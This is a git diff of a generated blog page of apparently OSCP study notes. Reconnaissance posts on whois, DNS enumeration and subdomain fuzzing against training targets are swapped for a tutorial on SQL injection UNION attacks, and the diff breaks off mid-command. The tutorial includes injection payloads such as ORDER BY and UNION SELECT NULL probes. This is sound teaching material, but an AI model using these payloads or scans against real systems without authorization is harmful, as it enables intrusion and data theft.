@@ -21,7 +21,7 @@
                 <li class="ephemeral selected"><a href="https://sfinx.kozow.com/author/medsecure.html">MedSecure</a></li>
                 <li><a href="https://sfinx.kozow.com/">Home</a></li>
                 <li><a href="https://github.com/Medaz-Sploit">GitHub</a></li>
-                <li><a href="https://sfinx.kozow.com/authors">Authors</a></li>
+                <li><a href="https://sfinx.kozow.com/{date:%Y}/{date:%-m}/{date:%-d}/{slug}/">PortSwigger</a></li>
                 <li><a href="https://sfinx.kozow.com/categories">Categories</a></li>
             </ul>
         </nav>
@@ -32,455 +32,736 @@
         </div>
     </header>
     <div id="wrapper">
-        <div id="content">            <h4 class="date">May 09, 2024</h4>
+        <div id="content">            <h4 class="date">May 19, 2024</h4>
 
             <article class="post">
                 <h2 class="title">
-                    <a href="https://sfinx.kozow.com/passive-enumeration.html" rel="bookmark" title="Permanent Link to &quot;Passive Enumeration&quot;">Passive Enumeration</a>
+                    <a href="https://sfinx.kozow.com/2024/5/19/sqli-union/" rel="bookmark" title="Permanent Link to &quot;SQL Injection UNION Attacks&quot;">SQL Injection UNION Attacks</a>
                 </h2>
 
                 
                 
 
-                <h3>WHOIS Enumeration</h3>
-<div class="highlight"><pre><span></span><code><span class="nv">@kali</span><span class="p">:~$</span> <span class="n">whois</span> <span class="n">megacorpone</span><span class="p">.</span><span class="n">com</span> <span class="n">-h</span> <span class="n">192</span><span class="p">.</span><span class="n">168</span><span class="p">.</span><span class="n">50</span><span class="p">.</span><span class="n">251</span>
-<span class="n">Domain</span> <span class="n">Name</span><span class="p">:</span> <span class="n">MEGACORPONE</span><span class="p">.</span><span class="n">COM</span>
-<span class="n">Registry</span> <span class="n">Domain</span> <span class="n">ID</span><span class="p">:</span> <span class="n">1775445745_DOMAIN_COM-VRSN</span>
-<span class="n">Registrar</span> <span class="n">WHOIS</span> <span class="n">Server</span><span class="p">:</span> <span class="n">whois</span><span class="p">.</span><span class="n">gandi</span><span class="p">.</span><span class="n">net</span>
-<span class="n">Registrar</span> <span class="n">URL</span><span class="p">:</span> <span class="n">http</span><span class="p">://</span><span class="n">www</span><span class="p">.</span><span class="n">gandi</span><span class="p">.</span><span class="n">net</span>
-<span class="n">Updated</span> <span class="n">Date</span><span class="p">:</span> <span class="n">2019</span><span class="p">-</span><span class="n">01</span><span class="p">-</span><span class="n">01T09</span><span class="p">:</span><span class="n">45</span><span class="p">:</span><span class="n">03Z</span>
-<span class="n">Creation</span> <span class="n">Date</span><span class="p">:</span> <span class="n">2013</span><span class="p">-</span><span class="n">01</span><span class="p">-</span><span class="n">22T23</span><span class="p">:</span><span class="n">01</span><span class="p">:</span><span class="n">00Z</span>
-<span class="n">Registry</span> <span class="n">Expiry</span> <span class="n">Date</span><span class="p">:</span> <span class="n">2023</span><span class="p">-</span><span class="n">01</span><span class="p">-</span><span class="n">22T23</span><span class="p">:</span><span class="n">01</span><span class="p">:</span><span class="n">00Z</span>
-
-<span class="nv">@kali</span><span class="p">:~$</span> <span class="n">whois</span> <span class="n">38</span><span class="p">.</span><span class="n">100</span><span class="p">.</span><span class="n">193</span><span class="p">.</span><span class="n">70</span> <span class="n">-h</span> <span class="n">192</span><span class="p">.</span><span class="n">168</span><span class="p">.</span><span class="n">50</span><span class="p">.</span><span class="n">251</span>
-<span class="p">...</span>
-<span class="n">NetRange</span><span class="p">:</span>
-<span class="n">38</span><span class="p">.</span><span class="n">0</span><span class="p">.</span><span class="n">0</span><span class="p">.</span><span class="n">0</span> <span class="p">-</span> <span class="n">38</span><span class="p">.</span><span class="n">255</span><span class="p">.</span><span class="n">255</span><span class="p">.</span><span class="n">255</span>
-<span class="n">CIDR</span><span class="p">:</span>
-<span class="n">38</span><span class="p">.</span><span class="n">0</span><span class="p">.</span><span class="n">0</span><span class="p">.</span><span class="n">0</span><span class="p">/</span><span class="n">8</span>
+                <h1>SQL injection UNION attacks</h1>
+<h1>OSCP/WEB/PORTSWIGGER/LearningPath/ServerSide/SQLINJECTION</h1>
+<p><img alt="Photo" src="https://sfinx.kozow.com/2024/5/19/sqli-union/SQLI_UNION/union_based_sql_injection.png"></p>
+<p>When an application is vulnerable to SQL injection and the results of the query are returned within the application's responses, the ==UNION== keyword can be used to retrieve data from other tables within the database. This results in a SQL injection UNION attack.</p>
+<p>The ==UNION== keyword lets you execute one or more additional ==SELECT== queries and append the results to the original query. For example:</p>
+<div class="highlight"><pre><span></span><code><span class="k">SELECT</span><span class="w"> </span><span class="n">a</span><span class="p">,</span><span class="w"> </span><span class="n">b</span><span class="w"> </span><span class="k">FROM</span><span class="w"> </span><span class="n">table1</span><span class="w"> </span><span class="k">UNION</span><span class="w"> </span><span class="k">SELECT</span><span class="w"> </span><span class="k">c</span><span class="p">,</span><span class="w"> </span><span class="n">d</span><span class="w"> </span><span class="k">FROM</span><span class="w"> </span><span class="n">table2</span>
 </code></pre></div>
 
-<h3>Google Hacking</h3>
-<ul>
-<li>site:megacorpone.com</li>
-<li>ext:php</li>
-<li>filetype:html</li>
-<li>intitle:"index of" "parent directory"</li>
-<li>https://www.exploit-db.com/google-hacking-database</li>
-</ul>
-<h3>Netcraft</h3>
-<p>Let’s review some of Netcraft’s capabilities. For example, we can use Netcraft’s DNS search page
-(https://searchdns.netcraft.com) to gather information about the megacorpone.com domain.</p>
-<h3>Open-Source Code</h3>
-<p>This includes open-source projects and online code repositories such as GitHub, GitHub Gist, GitLab, and SourceForge</p>
-<p>Once we’ve logged in to our Github account, we can search MegaCorp One’s repos for interesting
-information. Let’s use filename:users to search for any files with the word “users” in the name.</p>
-<p>For larger repos, we can use several tools to
-help automate some of the searching, such as Gitrob and Gitleaks. Most of these tools
-require an access tokento use the source code-hosting provider’s API.</p>
-<blockquote>
-<p>Tools that search through source code for secrets, like Gitrob or Gitleaks,
-  generally rely on regular expressions or entropy233-based detections to identify
-  potentially useful information. Entropy-based detection attempts to find strings
-  that are randomly generated. The idea is that a long string of random characters
-  and numbers is probably a password. No matter how a tool searches for secrets,
-  no tool is perfect and they will miss things that a manual inspection might find.</p>
-</blockquote>
-<h3>Shodan</h3>
-<ul>
-<li>hostname:megacorpone.com.</li>
-<li>port:"22"</li>
-</ul>
-<h3>Security Headers and SSL/TLS</h3>
-<p>One such site, Security Headers will analyze HTTP response headers and provide basic
-analysis of the target site’s security posture. We can use this to get an idea of an organization’s
-coding and security practices based on the results.
-Let’s scan www.megacorpone.com and check the results.</p>
-                <div class="clear"></div>
-
-                <div class="info">
-                    <a href="https://sfinx.kozow.com/passive-enumeration.html">posted at 02:09</a>
-                    &nbsp;&middot;&nbsp;<a href="https://sfinx.kozow.com/category/oscp.html" rel="tag">OSCP</a>
-                </div>
-            </article>            <h4 class="date">May 08, 2024</h4>
-
-            <article class="post">
-                <h2 class="title">
-                    <a href="https://sfinx.kozow.com/active-enumeration.html" rel="bookmark" title="Permanent Link to &quot;Active Enumeration&quot;">Active Enumeration</a>
-                </h2>
-
-                
-                
-
-                <h3>DNS Enumeration</h3>
-<ul>
-<li><strong>NS</strong>: Nameserver records contain the name of the authoritative servers hosting the DNS records for a domain.</li>
-<li><strong>A</strong>: Also known as a host record, the “a record” contains the IPv4 address of a hostname (such as www.megacorpone.com)</li>
-<li><strong>AAAA</strong>: Also known as a quad A host record, the “aaaa record” contains the IPv6 address of a hostname (such as www.megacorpone.com).</li>
-<li><strong>MX</strong>: Mail Exchange records contain the names of the servers responsible for handling email for the domain. A domain can contain multiple MX records.</li>
-<li><strong>PTR</strong>: Pointer Records are used in reverse lookup zones and can find the records associated with an IP address.</li>
-<li><strong>CNAME</strong>: Canonical Name Records are used to create aliases for other host records.</li>
-<li><strong>TXT</strong>: Text records can contain any arbitrary data and be used for various purposes, such as domain ownership verification.</li>
-</ul>
-<div class="highlight"><pre><span></span><code><span class="nv">@kali</span><span class="p">:~$</span> <span class="n">host</span> <span class="n">www</span><span class="p">.</span><span class="n">megacorpone</span><span class="p">.</span><span class="n">com</span>
-<span class="n">www</span><span class="p">.</span><span class="n">megacorpone</span><span class="p">.</span><span class="n">com</span> <span class="n">has</span> <span class="n">address</span> <span class="n">149</span><span class="p">.</span><span class="n">56</span><span class="p">.</span><span class="n">244</span><span class="p">.</span><span class="n">87</span>
-
-<span class="nv">@kali</span><span class="p">:~$</span> <span class="n">host</span> <span class="n">-t</span> <span class="n">mx</span> <span class="n">megacorpone</span><span class="p">.</span><span class="n">com</span>
-<span class="n">megacorpone</span><span class="p">.</span><span class="n">com</span> <span class="n">mail</span> <span class="n">is</span> <span class="n">handled</span> <span class="n">by</span> <span class="n">10</span> <span class="n">fb</span><span class="p">.</span><span class="n">mail</span><span class="p">.</span><span class="n">gandi</span><span class="p">.</span><span class="n">net</span><span class="p">.</span>
-<span class="n">megacorpone</span><span class="p">.</span><span class="n">com</span> <span class="n">mail</span> <span class="n">is</span> <span class="n">handled</span> <span class="n">by</span> <span class="n">20</span> <span class="n">spool</span><span class="p">.</span><span class="n">mail</span><span class="p">.</span><span class="n">gandi</span><span class="p">.</span><span class="n">net</span><span class="p">.</span>
-<span class="n">megacorpone</span><span class="p">.</span><span class="n">com</span> <span class="n">mail</span> <span class="n">is</span> <span class="n">handled</span> <span class="n">by</span> <span class="n">50</span> <span class="n">mail</span><span class="p">.</span><span class="n">megacorpone</span><span class="p">.</span><span class="n">com</span><span class="p">.</span>
-<span class="n">megacorpone</span><span class="p">.</span><span class="n">com</span> <span class="n">mail</span> <span class="n">is</span> <span class="n">handled</span> <span class="n">by</span> <span class="n">60</span> <span class="n">mail2</span><span class="p">.</span><span class="n">megacorpone</span><span class="p">.</span><span class="n">com</span><span class="p">.</span>
-
-<span class="nv">@kali</span><span class="p">:~$</span> <span class="n">host</span> <span class="n">-t</span> <span class="n">txt</span> <span class="n">megacorpone</span><span class="p">.</span><span class="n">com</span>
-<span class="n">megacorpone</span><span class="p">.</span><span class="n">com</span> <span class="n">descriptive</span> <span class="n">text</span> <span class="s2">&quot;Try Harder&quot;</span>
-<span class="n">megacorpone</span><span class="p">.</span><span class="n">com</span> <span class="n">descriptive</span> <span class="n">text</span> <span class="s2">&quot;google-site-</span>
-<span class="s2">verification=U7B_b0HNeBtY4qYGQZNsEYXfCJ32hMNV3GtC0wWq5pA&quot;</span>
-
-<span class="nv">@kali</span><span class="p">:~$</span> <span class="n">host</span> <span class="n">www</span><span class="p">.</span><span class="n">megacorpone</span><span class="p">.</span><span class="n">com</span>
-<span class="n">www</span><span class="p">.</span><span class="n">megacorpone</span><span class="p">.</span><span class="n">com</span> <span class="n">has</span> <span class="n">address</span> <span class="n">149</span><span class="p">.</span><span class="n">56</span><span class="p">.</span><span class="n">244</span><span class="p">.</span><span class="n">87</span>
-
-<span class="nv">@kali</span><span class="p">:~$</span> <span class="n">host</span> <span class="n">idontexist</span><span class="p">.</span><span class="n">megacorpone</span><span class="p">.</span><span class="n">com</span>
-<span class="n">Host</span> <span class="n">idontexist</span><span class="p">.</span><span class="n">megacorpone</span><span class="p">.</span><span class="n">com</span> <span class="n">not</span> <span class="n">found</span><span class="p">:</span> <span class="n">3</span><span class="p">(</span><span class="n">NXDOMAIN</span><span class="p">)</span>
+<p>This SQL query will return a single result set with two columns, containing values from columns ==a== and ==b== in ==table1== and columns c and d in table2.
+For a ==UNION== query to work, two key requirements must be met:
+* The individual queries must return the same number of columns.
+* The data types in each column must be compatible between the individual queries.</p>
+<p>⠀To carry out a SQL injection UNION attack, you need to ensure that your attack meets these two requirements. This generally involves figuring out:
+* How many columns are being returned from the original query?
+* Which columns returned from the original query are of a suitable data type to hold the results from the injected query?</p>
+<h2>Determining the number of columns required in a SQL injection UNION attacks</h2>
+<p>When performing a SQL injection UNION attack, there are two effective methods to determine how many columns are being returned from the original query.
+The first method involves injecting a series of ==ORDER BY== clauses and incrementing the specified column index until an error occurs. For example, assuming the injection point is a quoted string within the ==WHERE== clause of the original query, you would submit:</p>
+<div class="highlight"><pre><span></span><code><span class="s1">&#39; ORDER BY 1--</span>
+<span class="s1">&#39;</span><span class="w"> </span><span class="k">ORDER</span><span class="w"> </span><span class="k">BY</span><span class="w"> </span><span class="mi">2</span><span class="c1">--</span>
+<span class="err">&#39;</span><span class="w"> </span><span class="k">ORDER</span><span class="w"> </span><span class="k">BY</span><span class="w"> </span><span class="mi">3</span><span class="c1">--</span>
+<span class="n">etc</span><span class="p">.</span>
 </code></pre></div>
 
-<div class="highlight"><pre><span></span><code><span class="nv">@kali</span><span class="p">:~$</span> <span class="n">dig</span> <span class="nv">@nagoya</span><span class="p">.</span><span class="n">nagoya-industries</span><span class="p">.</span><span class="n">com</span> <span class="n">nagoya-industries</span><span class="p">.</span><span class="n">com</span> <span class="p">+</span><span class="n">tcp</span>
+<p>This series of payloads modifies the original query to order the results by different columns in the result set. The column in an ==ORDER BY== clause can be specified by its index, so you don't need to know the names of any columns. When the specified column index exceeds the number of actual columns in the result set, the database returns an error, such as:</p>
+<div class="highlight"><pre><span></span><code>The ORDER BY position number 3 is out of range of the number of items in the select list.
 </code></pre></div>
 
-<div class="highlight"><pre><span></span><code><span class="nv">@kali</span><span class="p">:~$</span> <span class="nb">cat </span><span class="n">list</span><span class="p">.</span><span class="n">txt</span>
-<span class="n">www</span>
-<span class="n">ftp</span>
-<span class="n">mail</span>
-<span class="n">owa</span>
-<span class="n">proxy</span>
-<span class="n">router</span>
-
-<span class="nv">@kali</span><span class="p">:~$</span> <span class="k">for</span> <span class="n">ip</span> <span class="k">in</span> <span class="p">$(</span><span class="nb">cat </span><span class="n">list</span><span class="p">.</span><span class="n">txt</span><span class="p">);</span> <span class="k">do</span> <span class="n">host</span> <span class="nv">$ip</span><span class="p">.</span><span class="n">megacorpone</span><span class="p">.</span><span class="n">com</span><span class="p">;</span> <span class="n">done</span>
-<span class="n">www</span><span class="p">.</span><span class="n">megacorpone</span><span class="p">.</span><span class="n">com</span> <span class="n">has</span> <span class="n">address</span> <span class="n">149</span><span class="p">.</span><span class="n">56</span><span class="p">.</span><span class="n">244</span><span class="p">.</span><span class="n">87</span>
-<span class="n">Host</span> <span class="n">ftp</span><span class="p">.</span><span class="n">megacorpone</span><span class="p">.</span><span class="n">com</span> <span class="n">not</span> <span class="n">found</span><span class="p">:</span> <span class="n">3</span><span class="p">(</span><span class="n">NXDOMAIN</span><span class="p">)</span>
-<span class="n">mail</span><span class="p">.</span><span class="n">megacorpone</span><span class="p">.</span><span class="n">com</span> <span class="n">has</span> <span class="n">address</span> <span class="n">51</span><span class="p">.</span><span class="n">222</span><span class="p">.</span><span class="n">169</span><span class="p">.</span><span class="n">212</span>
-<span class="n">Host</span> <span class="n">owa</span><span class="p">.</span><span class="n">megacorpone</span><span class="p">.</span><span class="n">com</span> <span class="n">not</span> <span class="n">found</span><span class="p">:</span> <span class="n">3</span><span class="p">(</span><span class="n">NXDOMAIN</span><span class="p">)</span>
-<span class="n">Host</span> <span class="n">proxy</span><span class="p">.</span><span class="n">megacorpone</span><span class="p">.</span><span class="n">com</span> <span class="n">not</span> <span class="n">found</span><span class="p">:</span> <span class="n">3</span><span class="p">(</span><span class="n">NXDOMAIN</span><span class="p">)</span>
-<span class="n">router</span><span class="p">.</span><span class="n">megacorpone</span><span class="p">.</span><span class="n">com</span> <span class="n">has</span> <span class="n">address</span> <span class="n">51</span><span class="p">.</span><span class="n">222</span><span class="p">.</span><span class="n">169</span><span class="p">.</span><span class="n">214</span>
+<p>The application might actually return the database error in its HTTP response, or it might return a generic error, or simply return no results. Provided you can detect some difference in the application's response, you can infer how many columns are being returned from the query.
+The second method involves submitting a series of ==UNION== ==SELECT== payloads specifying a different number of null values:</p>
+<div class="highlight"><pre><span></span><code><span class="s1">&#39; UNION SELECT NULL--</span>
+<span class="s1">&#39;</span><span class="w"> </span><span class="k">UNION</span><span class="w"> </span><span class="k">SELECT</span><span class="w"> </span><span class="k">NULL</span><span class="p">,</span><span class="k">NULL</span><span class="c1">--</span>
+<span class="err">&#39;</span><span class="w"> </span><span class="k">UNION</span><span class="w"> </span><span class="k">SELECT</span><span class="w"> </span><span class="k">NULL</span><span class="p">,</span><span class="k">NULL</span><span class="p">,</span><span class="k">NULL</span><span class="c1">--</span>
+<span class="n">etc</span><span class="p">.</span>
 </code></pre></div>
 
-<div class="highlight"><pre><span></span><code><span class="nv">@kali</span><span class="p">:~$</span> <span class="n">wfuzz</span> <span class="n">-w</span> <span class="p">/</span><span class="n">usr</span><span class="p">/</span><span class="n">share</span><span class="p">/</span><span class="n">wordlists</span><span class="p">/</span><span class="n">dnsmap</span><span class="p">.</span><span class="n">txt</span> <span class="n">-u</span> <span class="n">http</span><span class="p">://</span><span class="n">devvortex</span><span class="p">.</span><span class="n">htb</span> <span class="n">-H</span> <span class="s1">&#39;Host: FUZZ.devvortex.htb&#39;</span> <span class="n">-t</span> <span class="n">50</span> <span class="p">-</span><span class="n">-hc</span> <span class="n">302</span>
-
-<span class="p">********************************************************</span>
-<span class="p">*</span> <span class="n">Wfuzz</span> <span class="n">3</span><span class="p">.</span><span class="n">1</span><span class="p">.</span><span class="n">0</span> <span class="p">-</span> <span class="n">The</span> <span class="n">Web</span> <span class="n">Fuzzer</span>                         <span class="p">*</span>
-<span class="p">********************************************************</span>
-
-<span class="n">Target</span><span class="p">:</span> <span class="n">http</span><span class="p">://</span><span class="n">devvortex</span><span class="p">.</span><span class="n">htb</span><span class="p">/</span>
-<span class="n">Total</span> <span class="n">requests</span><span class="p">:</span> <span class="n">17576</span>
-
-<span class="p">=====================================================================</span>
-<span class="n">ID</span>           <span class="n">Response</span>   <span class="n">Lines</span>    <span class="n">Word</span>       <span class="n">Chars</span>       <span class="n">Payload</span>                     
-<span class="p">=====================================================================</span>
-
-<span class="n">000002154</span><span class="p">:</span>   <span class="n">200</span>        <span class="n">501</span> <span class="n">L</span>    <span class="n">1581</span> <span class="n">W</span>     <span class="n">23221</span> <span class="n">Ch</span>    <span class="s2">&quot;dev&quot;</span>
+<p>If the number of nulls does not match the number of columns, the database returns an error, such as:</p>
+<div class="highlight"><pre><span></span><code>All queries combined using a UNION, INTERSECT or EXCEPT operator must have an equal number of expressions in their target lists.
 </code></pre></div>
 
-<div class="highlight"><pre><span></span><code><span class="nv">@kali</span><span class="p">:~$</span> <span class="n">gobuster</span> <span class="n">vhost</span> <span class="n">-u</span> <span class="n">devvortex</span><span class="p">.</span><span class="n">htb</span> <span class="n">-w</span> <span class="p">/</span><span class="n">usr</span><span class="p">/</span><span class="n">share</span><span class="p">/</span><span class="n">wordlists</span><span class="p">/</span><span class="n">dnsmap</span><span class="p">.</span><span class="n">txt</span>
-</code></pre></div>
-
-<div class="highlight"><pre><span></span><code><span class="nv">@kali</span><span class="p">:~$</span> <span class="k">for</span> <span class="n">ip</span> <span class="k">in</span> <span class="p">$(</span><span class="n">seq</span> <span class="n">200</span> <span class="n">254</span><span class="p">);</span> <span class="k">do</span> <span class="n">host</span> <span class="n">51</span><span class="p">.</span><span class="n">222</span><span class="p">.</span><span class="n">169</span><span class="p">.</span><span class="nv">$ip</span><span class="p">;</span> <span class="n">done</span> <span class="p">|</span> <span class="n">grep</span> <span class="n">-v</span> <span class="s2">&quot;not</span>
-<span class="s2">found&quot;</span>
-<span class="p">...</span>
-<span class="n">208</span><span class="p">.</span><span class="n">169</span><span class="p">.</span><span class="n">222</span><span class="p">.</span><span class="n">51</span><span class="p">.</span><span class="k">in</span><span class="n">-addr</span><span class="p">.</span><span class="n">arpa</span> <span class="n">domain</span> <span class="n">name</span> <span class="n">pointer</span> <span class="n">admin</span><span class="p">.</span><span class="n">megacorpone</span><span class="p">.</span><span class="n">com</span><span class="p">.</span>
-<span class="n">209</span><span class="p">.</span><span class="n">169</span><span class="p">.</span><span class="n">222</span><span class="p">.</span><span class="n">51</span><span class="p">.</span><span class="k">in</span><span class="n">-addr</span><span class="p">.</span><span class="n">arpa</span> <span class="n">domain</span> <span class="n">name</span> <span class="n">pointer</span> <span class="n">beta</span><span class="p">.</span><span class="n">megacorpone</span><span class="p">.</span><span class="n">com</span><span class="p">.</span>
-<span class="n">210</span><span class="p">.</span><span class="n">169</span><span class="p">.</span><span class="n">222</span><span class="p">.</span><span class="n">51</span><span class="p">.</span><span class="k">in</span><span class="n">-addr</span><span class="p">.</span><span class="n">arpa</span> <span class="n">domain</span> <span class="n">name</span> <span class="n">pointer</span> <span class="n">fs1</span><span class="p">.</span><span class="n">megacorpone</span><span class="p">.</span><span class="n">com</span><span class="p">.</span>
-<span class="n">211</span><span class="p">.</span><span class="n">169</span><span class="p">.</span><span class="n">222</span><span class="p">.</span><span class="n">51</span><span class="p">.</span><span class="k">in</span><span class="n">-addr</span><span class="p">.</span><span class="n">arpa</span> <span class="n">domain</span> <span class="n">name</span> <span class="n">pointer</span> <span class="n">intranet</span><span class="p">.</span><span class="n">megacorpone</span><span class="p">.</span><span class="n">com</span><span class="p">.</span>
-<span class="n">212</span><span class="p">.</span><span class="n">169</span><span class="p">.</span><span class="n">222</span><span class="p">.</span><span class="n">51</span><span class="p">.</span><span class="k">in</span><span class="n">-addr</span><span class="p">.</span><span class="n">arpa</span> <span class="n">domain</span> <span class="n">name</span> <span class="n">pointer</span> <span class="n">mail</span><span class="p">.</span><span class="n">megacorpone</span><span class="p">.</span><span class="n">com</span><span class="p">.</span>
-<span class="n">213</span><span class="p">.</span><span class="n">169</span><span class="p">.</span><span class="n">222</span><span class="p">.</span><span class="n">51</span><span class="p">.</span><span class="k">in</span><span class="n">-addr</span><span class="p">.</span><span class="n">arpa</span> <span class="n">domain</span> <span class="n">name</span> <span class="n">pointer</span> <span class="n">mail2</span><span class="p">.</span><span class="n">megacorpone</span><span class="p">.</span><span class="n">com</span><span class="p">.</span>
-<span class="n">214</span><span class="p">.</span><span class="n">169</span><span class="p">.</span><span class="n">222</span><span class="p">.</span><span class="n">51</span><span class="p">.</span><span class="k">in</span><span class="n">-addr</span><span class="p">.</span><span class="n">arpa</span> <span class="n">domain</span> <span class="n">name</span> <span class="n">pointer</span> <span class="n">router</span><span class="p">.</span><span class="n">megacorpone</span><span class="p">.</span><span class="n">com</span><span class="p">.</span>
-<span class="n">215</span><span class="p">.</span><span class="n">169</span><span class="p">.</span><span class="n">222</span><span class="p">.</span><span class="n">51</span><span class="p">.</span><span class="k">in</span><span class="n">-addr</span><span class="p">.</span><span class="n">arpa</span> <span class="n">domain</span> <span class="n">name</span> <span class="n">pointer</span> <span class="n">siem</span><span class="p">.</span><span class="n">megacorpone</span><span class="p">.</span><span class="n">com</span><span class="p">.</span>
-<span class="n">216</span><span class="p">.</span><span class="n">169</span><span class="p">.</span><span class="n">222</span><span class="p">.</span><span class="n">51</span><span class="p">.</span><span class="k">in</span><span class="n">-addr</span><span class="p">.</span><span class="n">arpa</span> <span class="n">domain</span> <span class="n">name</span> <span class="n">pointer</span> <span class="n">snmp</span><span class="p">.</span><span class="n">megacorpone</span><span class="p">.</span><span class="n">com</span><span class="p">.</span>
-<span class="n">217</span><span class="p">.</span><span class="n">169</span><span class="p">.</span><span class="n">222</span><span class="p">.</span><span class="n">51</span><span class="p">.</span><span class="k">in</span><span class="n">-addr</span><span class="p">.</span><span class="n">arpa</span> <span class="n">domain</span> <span class="n">name</span> <span class="n">pointer</span> <span class="n">syslog</span><span class="p">.</span><span class="n">megacorpone</span><span class="p">.</span><span class="n">com</span><span class="p">.</span>
-<span class="n">218</span><span class="p">.</span><span class="n">169</span><span class="p">.</span><span class="n">222</span><span class="p">.</span><span class="n">51</span><span class="p">.</span><span class="k">in</span><span class="n">-addr</span><span class="p">.</span><span class="n">arpa</span> <span class="n">domain</span> <span class="n">name</span> <span class="n">pointer</span> <span class="n">support</span><span class="p">.</span><span class="n">megacorpone</span><span class="p">.</span><span class="n">com</span><span class="p">.</span>
-<span class="n">219</span><span class="p">.</span><span class="n">169</span><span class="p">.</span><span class="n">222</span><span class="p">.</span><span class="n">51</span><span class="p">.</span><span class="k">in</span><span class="n">-addr</span><span class="p">.</span><span class="n">arpa</span> <span class="n">domain</span> <span class="n">name</span> <span class="n">pointer</span> <span class="n">test</span><span class="p">.</span><span class="n">megacorpone</span><span class="p">.</span><span class="n">com</span><span class="p">.</span>
-<span class="n">220</span><span class="p">.</span><span class="n">169</span><span class="p">.</span><span class="n">222</span><span class="p">.</span><span class="n">51</span><span class="p">.</span><span class="k">in</span><span class="n">-addr</span><span class="p">.</span><span class="n">arpa</span> <span class="n">domain</span> <span class="n">name</span> <span class="n">pointer</span> <span class="n">vpn</span><span class="p">.</span><span class="n">megacorpone</span><span class="p">.</span><span class="n">com</span><span class="p">.</span>
-</code></pre></div>
-
-<div class="highlight"><pre><span></span><code><span class="nv">@kali</span><span class="p">:~$</span> <span class="n">dnsrecon</span> <span class="n">-d</span> <span class="n">megacorpone</span><span class="p">.</span><span class="n">com</span> <span class="n">-t</span> <span class="n">std</span>
-<span class="p">[*]</span> <span class="n">std</span><span class="p">:</span> <span class="n">Performing</span> <span class="n">General</span> <span class="n">Enumeration</span> <span class="n">against</span><span class="p">:</span> <span class="n">megacorpone</span><span class="p">.</span><span class="n">com</span><span class="p">...</span>
-<span class="p">[-]</span> <span class="n">DNSSEC</span> <span class="n">is</span> <span class="n">not</span> <span class="n">configured</span> <span class="k">for</span> <span class="n">megacorpone</span><span class="p">.</span><span class="n">com</span>
-<span class="p">[*]</span> <span class="n">SOA</span> <span class="n">ns1</span><span class="p">.</span><span class="n">megacorpone</span><span class="p">.</span><span class="n">com</span> <span class="n">51</span><span class="p">.</span><span class="n">79</span><span class="p">.</span><span class="n">37</span><span class="p">.</span><span class="n">18</span>
-<span class="p">[*]</span> <span class="n">NS</span> <span class="n">ns1</span><span class="p">.</span><span class="n">megacorpone</span><span class="p">.</span><span class="n">com</span> <span class="n">51</span><span class="p">.</span><span class="n">79</span><span class="p">.</span><span class="n">37</span><span class="p">.</span><span class="n">18</span>
-<span class="p">[*]</span> <span class="n">NS</span> <span class="n">ns3</span><span class="p">.</span><span class="n">megacorpone</span><span class="p">.</span><span class="n">com</span> <span class="n">66</span><span class="p">.</span><span class="n">70</span><span class="p">.</span><span class="n">207</span><span class="p">.</span><span class="n">180</span>
-<span class="p">[*]</span> <span class="n">NS</span> <span class="n">ns2</span><span class="p">.</span><span class="n">megacorpone</span><span class="p">.</span><span class="n">com</span> <span class="n">51</span><span class="p">.</span><span class="n">222</span><span class="p">.</span><span class="n">39</span><span class="p">.</span><span class="n">63</span>
-<span class="p">[*]</span> <span class="n">MX</span> <span class="n">mail</span><span class="p">.</span><span class="n">megacorpone</span><span class="p">.</span><span class="n">com</span> <span class="n">51</span><span class="p">.</span><span class="n">222</span><span class="p">.</span><span class="n">169</span><span class="p">.</span><span class="n">212</span>
-<span class="p">[*]</span> <span class="n">MX</span> <span class="n">spool</span><span class="p">.</span><span class="n">mail</span><span class="p">.</span><span class="n">gandi</span><span class="p">.</span><span class="n">net</span> <span class="n">217</span><span class="p">.</span><span class="n">70</span><span class="p">.</span><span class="n">178</span><span class="p">.</span><span class="n">1</span>
-<span class="p">[*]</span> <span class="n">MX</span> <span class="n">fb</span><span class="p">.</span><span class="n">mail</span><span class="p">.</span><span class="n">gandi</span><span class="p">.</span><span class="n">net</span> <span class="n">217</span><span class="p">.</span><span class="n">70</span><span class="p">.</span><span class="n">178</span><span class="p">.</span><span class="n">217</span>
-<span class="p">[*]</span> <span class="n">MX</span> <span class="n">fb</span><span class="p">.</span><span class="n">mail</span><span class="p">.</span><span class="n">gandi</span><span class="p">.</span><span class="n">net</span> <span class="n">217</span><span class="p">.</span><span class="n">70</span><span class="p">.</span><span class="n">178</span><span class="p">.</span><span class="n">216</span>
-<span class="p">[*]</span> <span class="n">MX</span> <span class="n">fb</span><span class="p">.</span><span class="n">mail</span><span class="p">.</span><span class="n">gandi</span><span class="p">.</span><span class="n">net</span> <span class="n">217</span><span class="p">.</span><span class="n">70</span><span class="p">.</span><span class="n">178</span><span class="p">.</span><span class="n">215</span>
-<span class="p">[*]</span> <span class="n">MX</span> <span class="n">mail2</span><span class="p">.</span><span class="n">megacorpone</span><span class="p">.</span><span class="n">com</span> <span class="n">51</span><span class="p">.</span><span class="n">222</span><span class="p">.</span><span class="n">169</span><span class="p">.</span><span class="n">213</span>
-<span class="p">[*]</span> <span class="n">TXT</span> <span class="n">megacorpone</span><span class="p">.</span><span class="n">com</span> <span class="k">Try</span> <span class="n">Harder</span>
-<span class="p">[*]</span> <span class="n">TXT</span> <span class="n">megacorpone</span><span class="p">.</span><span class="n">com</span> <span class="n">google-site</span><span class="p">-</span>
-<span class="n">verification</span><span class="p">=</span><span class="n">U7B_b0HNeBtY4qYGQZNsEYXfCJ32hMNV3GtC0wWq5pA</span>
-<span class="p">[*]</span> <span class="n">Enumerating</span> <span class="n">SRV</span> <span class="n">Records</span>
-<span class="p">[+]</span> <span class="n">0</span> <span class="n">Records</span> <span class="n">Found</span>
-</code></pre></div>
-
-<div class="highlight"><pre><span></span><code><span class="nv">@kali</span><span class="p">:~$</span> <span class="nb">cat </span><span class="n">list</span><span class="p">.</span><span class="n">txt</span>
-<span class="n">www</span>
-<span class="n">ftp</span>
-<span class="n">mail</span>
-<span class="n">owa</span>
-<span class="n">proxy</span>
-<span class="n">router</span>
-
-<span class="nv">@kali</span><span class="p">:~$</span> <span class="n">dnsrecon</span> <span class="n">-d</span> <span class="n">megacorpone</span><span class="p">.</span><span class="n">com</span> <span class="n">-D</span> <span class="p">~/</span><span class="n">list</span><span class="p">.</span><span class="n">txt</span> <span class="n">-t</span> <span class="n">brt</span>
